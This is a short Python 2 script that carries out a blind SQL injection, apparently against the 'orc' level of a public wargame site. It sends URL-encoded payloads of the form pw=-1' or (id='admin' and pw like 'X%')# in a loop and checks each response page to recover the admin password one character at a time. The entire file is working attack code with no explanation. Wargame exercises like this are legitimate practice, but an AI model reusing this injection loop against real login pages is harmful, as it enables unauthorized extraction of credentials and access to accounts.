# -*- coding: utf-8 -*-

import requests
from bs4 import BeautifulSoup

# 

s = requests.session()

'''

-	s.cookies.set('cookie-name', 'cookie-value', path='/', domain='.abc.com') 
-	c = requests.cookies.RequestsCookieJar()  
	c.set('cookie-name', 'cookie-value', path='/', domain='.abc.com')  
	s.cookies.update(c)  
'''
s.cookies['__cfduid'] = "****"
s.cookies['PHPSESSID'] = "****"

url = r"http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=-1%27%20or%20(id=%27admin%27%20and%20pw%20like%20%272%%27)%23"
v_l = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

addu = ""
i=0
while i<8:
    for k in range(10):
        t_url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=-1%27%20or%20(id=%27admin%27%20and%20" \
                "pw%20like%20'"+addu+str(k)+"%')%23"
        #print t_url
        response = s.get(t_url)
        bs = BeautifulSoup(response.content, "html.parser")
        if bs.h2:
            print k
            addu +=str(k)
            i+=1
            break
    for z in v_l:
        t_url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=-1%27%20or%20(id=%27admin%27%20and%20" \
                "pw%20like%20'" + addu + z + "%')%23"
        #print t_url
        response = s.get(t_url)
        bs = BeautifulSoup(response.content, "html.parser")
        if bs.h2:
            print z
            addu += z
            i += 1
            break
print addu